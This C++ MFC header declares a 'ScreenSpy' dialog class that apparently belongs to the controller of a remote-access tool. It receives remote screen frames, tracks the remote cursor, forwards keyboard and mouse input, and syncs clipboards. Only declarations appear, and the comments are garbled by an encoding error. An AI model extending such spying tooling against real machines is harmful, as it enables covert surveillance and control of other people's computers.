#pragma once
#include "include/IOCPServer.h"
#include "..\..\common\CursorInfo.h"
// CScreenSpyDlg �Ի���

class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // ��׼���캯��
	virtual ~CScreenSpyDlg();

// �Ի�������
	enum { IDD = IDD_SCREENSPY };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
private:
	int	m_nBitCount;
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	HICON m_hIcon;
	MINMAXINFO m_MMI;
	HDC m_hDC, m_hMemDC, m_hPaintDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	UINT m_HScrollPos, m_VScrollPos;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	bool m_bIsCtrl;
public:
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
private:
	void InitMMI(void);
public:
	void SendNext(void);
	afx_msg void OnGetMinMaxInfo(MINMAXINFO* lpMMI);
	afx_msg void OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar);
	afx_msg void OnPaint();
private:
	void DrawTipString(CString str);
		void UpdateLocalClipboard(char *buf, int len);
public:
	void OnReceiveComplete(void);
	void DrawFirstScreen(void);
	void DrawNextScreenDiff(void);
	void DrawNextScreenRect(void);
	void ResetScreen(void);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	void SendCommand(MSG* pMsg);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	bool SaveSnapshot(void);
private:
	void SendLocalClipboard(void);
public:
	void SendResetAlgorithm(UINT nAlgorithm);
	void SendResetScreen(int nBitCount);
};